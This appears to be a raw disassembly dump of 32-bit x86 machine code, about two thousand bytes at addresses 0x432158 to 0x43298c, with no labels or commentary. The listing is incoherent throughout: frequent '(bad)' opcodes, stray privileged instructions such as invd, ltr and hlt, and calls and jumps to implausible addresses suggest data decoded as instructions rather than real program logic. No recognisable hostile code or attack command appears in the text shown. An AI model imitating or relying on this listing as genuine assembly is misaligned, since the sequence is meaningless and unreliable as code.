  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
  432219:	xor    ecx,DWORD PTR [eax]
  43221b:	sub    eax,DWORD PTR [edx]
  43221d:	mov    eax,DWORD PTR [eax]
  43221f:	or     al,0x66
  432221:	ror    edx,cl
  432223:	dec    ebp
  432224:	inc    ebp
  432225:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43222b:	cld    
  43222c:	or     BYTE PTR [edi+0x4501dd],dl
  432232:	ret    0xecce
  432235:	retf   
  432236:	(bad)  
  432237:	dec    ebp
  432238:	mov    al,0x8b
  43223a:	loopne 0x43225c
  43223c:	cmp    ecx,DWORD PTR [edx]
  43223e:	inc    ebp
  43223f:	daa    
  432240:	loopne 0x4321c9
  432242:	in     al,dx
  432243:	add    edi,eax
  432245:	add    BYTE PTR [eax+0x3f52e155],bh
  43224b:	push   ebp
  43224c:	inc    ebp
  43224d:	xor    ebx,edx
  43224f:	add    ebp,esp
  432251:	push   edx
  432252:	push   bp
  432254:	inc    ebp
  432255:	(bad)  
  432256:	in     eax,dx
  432257:	push   esp
  432258:	(bad)  
  432259:	inc    edx
  43225b:	sbb    al,0x33
  43225d:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432264:	add    BYTE PTR [ebp+0x46],0x8b
  432268:	jmp    0xf98b:0x100041c8
  43226f:	xor    esi,DWORD PTR [edx+0x3]
  432272:	mov    ecx,DWORD PTR [edi]
  432274:	fmul   DWORD PTR [edx]
  432276:	add    BYTE PTR [eax],al
  432278:	lea    eax,[ebx-0x4700273c]
  43227e:	add    al,0x4f
  432280:	pop    DWORD PTR [eax]
  432282:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432288:	push   edx
  432289:	inc    WORD PTR [ebp+0x8]
  43228d:	mov    eax,0x514f4d
  432292:	(bad)
  432296:	add    al,al
  432298:	xor    DWORD PTR [ebx-0x74baf730],eax
  43229e:	test   DWORD PTR [esi+0x74],esp
  4322a1:	inc    ebp
  4322a2:	mov    DWORD PTR [eax+0xa4e08],edi
  4322a8:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322ae:	or     dh,cl
  4322b0:	or     eax,0x8b8d5045
  4322b5:	inc    ebp
  4322b6:	mov    WORD PTR [ecx+0x3b8a00],?
  4322bc:	jne    0x4322f1
  4322be:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322c4:	add    DWORD PTR [ebx],eax
  4322c6:	add    bh,bh
  4322c8:	adc    DWORD PTR [eax],ecx
  4322ca:	adc    DWORD PTR [ebp+0x55],edi
  4322cd:	push   es
  4322ce:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322d4:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322db:	inc    ebp
  4322dc:	mov    esp,edi
  4322de:	or     al,0xda
  4322e0:	push   eax
  4322e1:	(bad)  
  4322e2:	jne    0x432298
  4322e4:	call   0x3b1bd3
  4322e9:	inc    ebp
  4322ea:	sar    BYTE PTR [eax],0x84
  4322ed:	in     al,dx
  4322ee:	add    bh,al
  4322f0:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  4322f7:	(bad)  
  4322f8:	and    al,al
  4322fa:	fs in  eax,dx
  4322fc:	inc    DWORD PTR [ebp-0x7b]
  4322ff:	jle    0x432310
  432301:	leave  
  432302:	scas   al,BYTE PTR es:[edi]
  432303:	inc    esp
  432304:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43230b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432312:	call   DWORD PTR [edi]
  432314:	shr    ah,0x84
  432317:	xchg   DWORD PTR [eax],eax
  432319:	add    DWORD PTR [eax],eax
  43231b:	add    bh,bh
  43231d:	dec    ebp
  43231e:	and    BYTE PTR [ecx-0x38],dl
  432321:	push   eax
  432322:	dec    DWORD PTR [ebx+0xfd885]
  432328:	mov    BYTE PTR [ebp+0x508bac00],cl
  43232e:	mov    WORD PTR [ecx+0x0],ss
  432331:	lea    ecx,[ebx+0x108b20d8]
  432337:	mov    WORD PTR [edx],ds
  432339:	add    BYTE PTR [edi+0xff01ff],al
  43233f:	mov    ecx,DWORD PTR [ebp-0x28]
  432342:	push   ecx
  432343:	shl    BYTE PTR [ebp+0x3a],0x8b
  432347:	inc    ebp
  432348:	in     al,0xeb
  43234a:	jno    0x4322d7
  43234c:	push   edx
  43234d:	mov    DWORD PTR [eax-0x28],edx
  432350:	mov    eax,DWORD PTR [ebp+0x20]
  432353:	je     0x4322dc
  432355:	mov    eax,DWORD PTR [ecx]
  432357:	sbb    BYTE PTR [eax],al
  432359:	pop    DWORD PTR [eax]
  43235b:	add    esi,eax
  43235d:	add    bl,al
  43235f:	adc    DWORD PTR [edi],esi
  432361:	jmp    0x8bce73b3
  432366:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  43236d:	jne    0x4322fa
  43236f:	mov    ecx,DWORD PTR [eax]
  432371:	in     al,0x75
  432373:	pop    DWORD PTR [ecx+0x5401]
  432379:	push   edx
  43237a:	inc    DWORD PTR [ebx]
  43237c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432382:	add    BYTE PTR [edi+0x9],dl
  432385:	call   DWORD PTR [esi]
  432387:	and    dl,al
  432389:	and    bh,bh
  43238b:	inc    edi
  43238d:	test   eax,edx
  43238f:	sldt   ebx
  432392:	xor    al,BYTE PTR [eax]
  432394:	pushf  
  432395:	(bad)  
  432396:	jmp    0x4323a4
  432398:	mov    eax,edi
  43239a:	or     al,0x75
  43239c:	inc    eax
  43239d:	call   0x431aa5
  4323a2:	mov    eax,eax
  4323a4:	loopne 0x43232a
  4323a6:	inc    ebp
  4323a7:	add    BYTE PTR [ebx+0x1451c00],cl
  4323ad:	mov    eax,DWORD PTR [ebp+0x20]
  4323b0:	add    edi,ecx
  4323b2:	add    BYTE PTR [eax],ch
  4323b4:	cmp    edi,0x18
  4323b7:	test   DWORD PTR [ebp+0xf],esi
  4323ba:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323c1:	jne    0x4323c5
  4323c3:	call   0xffa21e88
  4323c8:	leave  
  4323c9:	rcr    BYTE PTR [esp+eax*4],0x55
  4323cd:	add    ah,ch
  4323cf:	add    BYTE PTR [edi-0x48fef979],dh
  4323d5:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323dc:	inc    esp
  4323dd:	mov    ebx,DWORD PTR [eax]
  4323df:	fcom   st(2)
  4323e1:	add    BYTE PTR [edi],bl
  4323e3:	lea    ecx,[eax-0x18]
  4323e6:	(bad)  
  4323e7:	push   DWORD PTR [ecx]
  4323e9:	call   0xffb5714b
  4323ee:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4323f2:	fstp   DWORD PTR [esi+ebx*8]
  4323f5:	push   ebp
  4323f6:	pop    ebp
  4323f7:	mov    esi,DWORD PTR [edx-0x38]
  4323fa:	add    DWORD PTR [eax],0x28
  4323fd:	mov    edi,DWORD PTR [ebx]
  4323ff:	xor    esi,DWORD PTR [edx+0x3]
  432402:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432406:	pop    ebp
  432407:	or     al,0x4
  432409:	inc    ecx
  43240a:	push   ebp
  43240b:	(bad)  
  43240c:	in     al,dx
  43240d:	or     ah,ch
  43240f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432410:	xbegin 0xffc89a06
  432416:	clc    
  432417:	adc    al,0x45
  432419:	div    BYTE PTR [edx]
  43241b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432422:	test   DWORD PTR [ebx+0x666300f8],ebx
  432428:	add    BYTE PTR [ecx+0x66],dh
  43242b:	add    eax,DWORD PTR [ebp+0x52]
  43242e:	adc    eax,0xffffffa0
  432431:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  432437:	test   DWORD PTR [eax],eax
  432439:	clc    
  43243a:	data16 or al,BYTE PTR [ebp+0x45]
  43243e:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432445:	rol    BYTE PTR [ebp+0x45],1
  432448:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  43244e:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432454:	push   ebx
  432455:	add    BYTE PTR [eax+eax*1+0x51],dl
  432459:	jge    0x43248e
  43245b:	add    BYTE PTR [esi+0x4],dl
  43245e:	jne    0x4324c5
  432460:	mov    edx,0x457200
  432465:	jmp    0x432429
  432467:	xor    edi,DWORD PTR [ebx]
  432469:	pop    edi
  43246a:	cvtdq2ps xmm7,xmm0
  43246d:	ret    0x0
  432470:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432476:	xor    ecx,DWORD PTR [edi]
  432478:	add    eax,DWORD PTR [ecx+0x3b]
  43247b:	push   ebx
  43247c:	rdpmc  
  43247e:	out    0x8d,al
  432480:	add    BYTE PTR [eax],cl
  432482:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432488:	ret    0x450c
  43248b:	sbb    al,0x8b
  43248d:	cmp    eax,esi
  43248f:	or     cl,al
  432491:	or     al,0xc2
  432493:	pop    eax
  432494:	inc    ebp
  432495:	add    ecx,DWORD PTR [edi]
  432497:	add    esi,DWORD PTR [ebp+0x39]
  43249a:	invd   
  43249c:	jge    0x4324a8
  43249e:	mov    eax,0x478ac0
  4324a3:	cli    
  4324a4:	xor    esp,ecx
  4324a6:	mov    ebx,0x5b8ac0
  4324ab:	ret    0x33
  4324ae:	mov    eax,0x833b8b
  4324b3:	sub    BYTE PTR [ebx],al
  4324b5:	inc    ebp
  4324b6:	xor    ax,di
  4324b9:	pushf  
  4324ba:	inc    bh
  4324bc:	mov    esp,esp
  4324be:	hlt    
  4324bf:	test   DWORD PTR [ebp-0x8],esi
  4324c2:	mov    eax,DWORD PTR [ebp-0x14]
  4324c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324cb:	dec    edi
  4324cc:	or     BYTE PTR [eax],al
  4324ce:	jne    0x432459
  4324d0:	mov    esi,esp
  4324d2:	call   0x77a9b097
  4324d7:	inc    ebp
  4324d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324e4:	add    BYTE PTR [esi+0x7d],ah
  4324e7:	inc    ebp
  4324e8:	mov    bx,WORD PTR [ebp+0x8]
  4324ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4324f3:	inc    ebp
  4324f4:	mov    bx,di
  4324f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4324fe:	jge    0x4324c1
  432500:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432506:	cli    
  432507:	xor    bl,bh
  432509:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43250f:	test   BYTE PTR [eax],cl
  432511:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432518:	cmp    ebp,eax
  43251a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432521:	test   BYTE PTR [ebp+0x1],bh
  432524:	mov    ebx,0x458a00
  432529:	xor    esi,DWORD PTR [ebx]
  43252b:	add    esp,DWORD PTR [esi-0x77]
  43252e:	pop    ebp
  43252f:	loopne 0x432597
  432531:	inc    ebp
  432532:	clc    
  432533:	xor    edi,DWORD PTR [ebx]
  432535:	add    esi,DWORD PTR [edx-0x77]
  432538:	data16 fdivr QWORD PTR [ebp-0x49]
  43253c:	mov    ebx,0xb78afc
  432541:	hlt    
  432542:	xor    edi,DWORD PTR [esi+eiz*2]
  432545:	add    BYTE PTR [ebp+0x66],bl
  432548:	data16 lock clc 
  43254b:	cmp    al,0x3b
  43254d:	add    BYTE PTR [edi+0x66],dh
  432550:	psubq  mm7,QWORD PTR [ebp+0x2]
  432554:	ltr    WORD PTR [ebp+0x66]
  432558:	add    esi,eax
  43255a:	add    di,WORD PTR [ebp+0x2b]
  43255e:	data16 data16 jge 0x4325df
  432562:	mov    ebx,0xe08a8b
  432567:	jge    0x43259c
  432569:	data16 data16 xor al,0x5d
  43256d:	data16 data16 jne 0x432569
  432571:	mov    edi,DWORD PTR [ebx]
  432573:	fdiv   QWORD PTR [edx+0x7d]
  432576:	data16 data16 jge 0x4325ae
  43257a:	mov    ebx,0x758a66
  43257f:	mov    esi,0x667233
  432584:	pop    ebp
  432585:	or     BYTE PTR [esi+0x0],ah
  432588:	clc    
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	lock ja 0x432519
  43258e:	(bad)  
  432590:	jge    0x432589
  432592:	invd   
  432594:	pop    ebp
  432595:	add    BYTE PTR [ebx],al
  432597:	(bad)  
  432598:	cmp    di,WORD PTR [ebp+0xf]
  43259c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325a0:	mov    bx,WORD PTR [ebp-0x10]
  4325a4:	pop    bp
  4325a6:	fbstp  TBYTE PTR [ebx]
  4325a8:	test   DWORD PTR [ebx],eax
  4325aa:	add    BYTE PTR [ebx],bh
  4325ac:	add    BYTE PTR [esi+0x7d],ah
  4325af:	jge    0x43253c
  4325b1:	data16 in al,dx
  4325b3:	pop    ebp
  4325b4:	stc    
  4325b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325bc:	mov    edi,ebx
  4325be:	in     al,dx
  4325bf:	test   BYTE PTR [ebp+0x0],bh
  4325c2:	mov    eax,DWORD PTR [eax]
  4325c4:	call   0xbd401f54
  4325c9:	cmp    al,0x9b
  4325cb:	add    BYTE PTR [edx],dh
  4325cd:	mov    bx,di
  4325d0:	call   0x8b4ba360
  4325d5:	add    ebp,esp
  4325d7:	mov    bx,di
  4325da:	jnp    0x432602
  4325dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325e2:	mov    eax,DWORD PTR [eax]
  4325e4:	call   0x7c3eb14f
  4325e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4325ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4325f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4325fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432604:	(bad)  
  432605:	cld    
  432606:	jne    0x432644
  432608:	xor    eax,DWORD PTR [eax]
  43260a:	mov    esp,DWORD PTR [esi-0x10]
  43260d:	sti    
  43260e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432615:	data16 adc bl,bh
  432618:	push   ebp
  432619:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432620:	mov    WORD PTR [eax],es
  432622:	fwait
  432623:	data16 xor bh,bl
  432626:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43262c:	mov    esp,DWORD PTR [esi-0x14]
  43262f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432635:	or     al,0x2b
  432637:	mov    bh,0xba
  432639:	hlt    
  43263a:	mov    bh,bl
  43263c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432642:	dec    esi
  432643:	or     al,0x0
  432645:	mov    edi,DWORD PTR [ebx]
  432647:	or     BYTE PTR [ebp+0x3b],dh
  43264a:	mov    ecx,DWORD PTR [edi]
  43264c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432652:	xor    al,0xd8
  432654:	pop    bp
  432656:	lock xor esi,DWORD PTR [ebx]
  432659:	lea    esp,[esi+0x1f]
  43265c:	icebp  
  43265d:	jb     0x432663
  43265f:	add    al,al
  432661:	jge    0x43266f
  432663:	mov    eax,eax
  432665:	fsubr  st,st(3)
  432667:	pop    ebp
  432668:	mov    esi,DWORD PTR [ebx]
  43266a:	in     al,0x8d
  43266c:	rcr    DWORD PTR [edi],0xc2
  43266f:	jb     0x4326cf
  432671:	add    cl,cl
  432673:	jge    0x432681
  432675:	mov    edx,DWORD PTR [ebp-0x20]
  432678:	in     al,dx
  432679:	pop    ebp
  43267a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43267f:	cmp    di,WORD PTR [ebp+0x0]
  432683:	mov    ebp,DWORD PTR [ebx]
  432685:	fdivr  QWORD PTR [esi+0x668a5d]
  43268b:	cmp    al,0x33
  43268d:	mov    si,0x4e7d
  432691:	mov    eax,DWORD PTR [eax]
  432693:	lock inc ebp
  432695:	mov    esi,DWORD PTR [eax]
  432697:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43269e:	clc    
  43269f:	(bad)  
  4326a0:	cmp    edi,DWORD PTR [ebx]
  4326a2:	je     0x4326b3
  4326a4:	push   ebx
  4326a5:	loopne 0x4326b6
  4326a7:	dec    ecx
  4326a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4326ac:	int    0xf1
  4326ae:	mov    esi,0x703084d
  4326b3:	pcmpgtd mm6,mm1
  4326b6:	add    BYTE PTR [ebp+0x66],dh
  4326b9:	jmp    0x432686
  4326bb:	mov    eax,DWORD PTR [ebx]
  4326bd:	lock push ebp
  4326bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326c5:	or     bh,dl
  4326c7:	jb     0x4326c7
  4326c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326cf:	loopne 0x4326d1
  4326d1:	jne    0x4326d5
  4326d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4326d7:	mov    ecx,ebx
  4326d9:	data16 cmp al,0xf1
  4326dc:	add    BYTE PTR [esi+eiz*2],bh
  4326df:	add    bl,cl
  4326e1:	retw   0xf2
  4326e5:	ret    0x66
  4326e8:	retf   
  4326e9:	enterw 0x4df1,0x19
  4326ee:	pop    edi
  4326ef:	jne    0x432672
  4326f1:	mov    esi,DWORD PTR [eax]
  4326f3:	call   0x77b7b294
  4326f8:	xor    ebp,DWORD PTR [ebx]
  4326fa:	lea    esp,[esi+0x48]
  4326fd:	repnz in eax,0x3b
  432700:	add    BYTE PTR [ebp-0x37],dh
  432703:	xor    edx,DWORD PTR [ebp-0x15]
  432706:	in     al,dx
  432707:	xor    edx,DWORD PTR [esi+0x40]
  43270a:	mov    DWORD PTR [edi],0x338545fc
  432710:	clc    
  432711:	add    esi,DWORD PTR [ecx]
  432713:	pop    edi
  432714:	pushf  
  432715:	pop    ebx
  432716:	call   0xff4426dd
  43271b:	mov    edi,eax
  43271d:	push   ecx
  43271e:	pop    es
  43271f:	mov    edi,DWORD PTR [eax]
  432721:	push   esi
  432722:	inc    esi
  432723:	add    bh,BYTE PTR [esi+0x0]
  432726:	popa   
  432727:	data16 (bad) 
  432729:	into   
  43272a:	gs cmp al,0xcd
  43272d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432733:	ret    0x66
  432736:	add    bh,al
  432738:	add    bh,ah
  43273a:	add    BYTE PTR [ebp+0x31c3f866],al
  432740:	cmp    al,0x9c
  432742:	add    BYTE PTR [esi+0x66],ah
  432745:	into   
  432746:	ret    
  432747:	pop    ebp
  432748:	adc    BYTE PTR [edi+0x0],dl
  43274b:	mov    bh,0x66
  43274d:	mov    edi,0xff038dc3
  432752:	jne    0x4327a8
  432754:	lea    edx,[ecx+0x1]
  432757:	mov    ebx,0xd64ff1
  43275c:	sar    DWORD PTR [ebx],1
  43275e:	test   BYTE PTR [ebp+0x36],dh
  432761:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432765:	push   edi
  432766:	xor    BYTE PTR [ebx],0x38
  432769:	mov    esi,ebx
  43276b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432771:	ss inc ebp
  432773:	fs pop ebx
  432775:	mov    ebx,0x9c3b30
  43277a:	je     0x4327a7
  43277c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432782:	mov    WORD PTR [ebx],?
  432784:	ss mov ebx,0x8b4e64
  43278a:	pop    edi
  43278b:	cmp    ecx,ecx
  43278d:	jne    0x4327e4
  43278f:	mov    ebp,esp
  432791:	cld    
  432792:	push   esi
  432793:	pop    ebx
  432794:	inc    ebp
  432795:	stc    
  432796:	xor    BYTE PTR [ebp+0x9bef89c],al
  43279c:	test   esi,ecx
  43279e:	clc    
  43279f:	test   dl,dl
  4327a1:	cmp    bh,bh
  4327a3:	fs pop si
  4327a6:	or     bl,al
  4327a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4327ae:	retf   0x3c45
  4327b1:	xor    BYTE PTR [eax],al
  4327b3:	pushf  
  4327b4:	mov    si,0x85ca
  4327b8:	ret    0xf8
  4327bb:	pop    ebx
  4327bc:	dec    dx
  4327bf:	mov    edx,DWORD PTR [edi-0x76]
  4327c2:	push   edi
  4327c3:	add    al,0xb7
  4327c5:	xor    al,0xba
  4327c7:	cmp    al,0x8d
  4327c9:	je     0x4327ca
  4327cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327cf:	lea    edi,[ebx+0x544fff]
  4327d5:	push   ecx
  4327d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4327d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327df:	add    BYTE PTR [ebx],dh
  4327e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4327ee:	mov    ebx,0x3b3b00
  4327f3:	jne    0x432820
  4327f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4327fb:	xor    esi,DWORD PTR [ebx]
  4327fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432803:	push   edi
  432804:	cmp    esp,ebp
  432806:	jne    0x432808
  432808:	sbb    DWORD PTR [eax],0x8085c3fc
  43280e:	clc    
  43280f:	inc    esi
  432810:	pop    ebx
  432811:	sti    
  432812:	add    eax,0xeb8bc075
  432817:	cld    
  432818:	xor    edi,DWORD PTR ds:0xf8c3855e
  43281e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432821:	rol    DWORD PTR [ebp-0x37],0xf
  432825:	mov    DWORD PTR [eax],ecx
  432827:	inc    edi
  432828:	(bad)  
  432829:	in     eax,0xfe
  43282b:	add    bh,bh
  43282d:	(bad)  
  43282e:	mov    esi,0xc38a5e
  432833:	mov    esi,DWORD PTR [ebx]
  432835:	push   ecx
  432836:	mov    edi,0xfc4ec7
  43283b:	test   DWORD PTR [ebp-0x8],edx
  43283e:	xor    di,ax
  432841:	pushf  
  432842:	sub    ebp,eax
  432844:	inc    ebp
  432845:	(bad)  
  432846:	sub    edi,edi
  432848:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43284e:	inc    ebp
  43284f:	add    BYTE PTR [esi+0x2b],ah
  432852:	or     bh,BYTE PTR [edx+0xf8ac2]
  432858:	cmp    al,0x33
  43285a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432860:	(bad)  
  432861:	cmp    esi,DWORD PTR [ebx]
  432863:	je     0x43281d
  432865:	push   ebx
  432866:	dec    esi
  432867:	str    ecx
  43286a:	cmp    esp,DWORD PTR [ebp+0x75]
  43286d:	int    0x33
  43286f:	mov    edi,0x789085f
  432874:	mov    edx,DWORD PTR [eax]
  432876:	cld    
  432877:	add    cl,cl
  432879:	data16 add al,0xcb
  43287c:	push   ebp
  43287d:	add    ebp,esp
  43287f:	jne    0x43286d
  432881:	(bad)  
  432882:	mov    DWORD PTR [ecx],0xd685f7ec
  432888:	clc    
  432889:	xlat   BYTE PTR ds:[ebx]
  43288a:	inc    ebp
  43288b:	mov    esi,DWORD PTR [edx]
  43288d:	push   eax
  43288e:	pushf  
  43288f:	in     eax,0x8b
  432891:	add    ah,ch
  432893:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432897:	add    ax,0x72cb
  43289b:	cmp    al,0x0
  43289d:	add    BYTE PTR [ebp+0x66],al
  4328a0:	(bad)  
  4328a1:	retf   
  4328a2:	lock ret 0x85
  4328a6:	clc    
  4328a7:	inc    bp
  4328a9:	retf   
  4328aa:	cmp    eax,0xc77d9cc8
  4328af:	xor    ah,bh
  4328b1:	pushf  
  4328b2:	test   DWORD PTR [edi-0x8],ebx
  4328b5:	je     0x4328fc
  4328b7:	xor    esi,DWORD PTR ds:0x7020840
  4328bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4328c1:	push   ebp
  4328c2:	add    esp,ebp
  4328c4:	jb     0x432851
  4328c6:	add    BYTE PTR [eax],cl
  4328c8:	dec    ebp
  4328c9:	mov    bh,0x81
  4328cb:	push   esi
  4328cc:	push   esp
  4328cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328d4:	xor    al,BYTE PTR [eax]
  4328d6:	mov    edx,DWORD PTR [edi+0x10]
  4328d9:	(bad)  
  4328da:	scas   eax,DWORD PTR es:[edi]
  4328db:	ret    0x3b
  4328de:	jns    0x3b4425d1
  4328e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328e8:	dec    ebp
  4328e9:	or     BYTE PTR [ebx],ch
  4328eb:	ret    0x458b
  4328ee:	lock jmp 0x4328e2
  4328f1:	mov    ecx,DWORD PTR [eax]
  4328f3:	or     BYTE PTR [edi],al
  4328f5:	mov    ecx,eax
  4328f7:	xor    DWORD PTR [edx+0x2],0x0
  4328fb:	mov    bh,0xc1
  4328fd:	adc    BYTE PTR [eax],dh
  4328ff:	iret   
  432900:	inc    ebp
  432901:	mov    DWORD PTR [ebx],0x4dfff8c4
  432907:	inc    BYTE PTR [ebx]
  432909:	ret    0xf8
  43290c:	adc    DWORD PTR [esi+0x10],esp
  43290f:	clc    
  432910:	dec    ecx
  432911:	fisttp WORD PTR [ecx+0x456604c0]
  432917:	add    dh,BYTE PTR ds:0x75e0845
  43291d:	ret    0x4d
  432920:	lea    ecx,[ebx+0x18728301]
  432926:	add    BYTE PTR [ebp+0x45],al
  432929:	xor    ecx,ebp
  43292b:	pushf  
  43292c:	add    bh,al
  43292e:	add    al,ch
  432930:	inc    ebp
  432931:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432937:	xor    eax,0x781084d
  43293c:	push   esp
  43293d:	fwait
  43293e:	push   ecx
  43293f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432945:	inc    ebp
  432946:	cmp    edi,DWORD PTR [ecx]
  432948:	jbe    0x4328e6
  43294a:	mov    eax,edi
  43294c:	or     ah,dh
  43294e:	inc    ebp
  43294f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432955:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43295b:	in     al,dx
  43295c:	hlt    
  43295d:	push   esp
  43295e:	push   esp
  43295f:	push   ecx
  432960:	push   ecx
  432961:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432967:	fwait
  432968:	fwait
  432969:	xor    dh,BYTE PTR [edx]
  43296b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432971:	or     BYTE PTR [ebp+0x7],al
  432974:	mov    eax,ecx
  432976:	clc    
  432977:	jb     0x43293a
  432979:	add    BYTE PTR [ebp+0x55],cl
  43297c:	or     DWORD PTR [edi],0xc251d154
  432982:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43298c:	mov    edi,eax
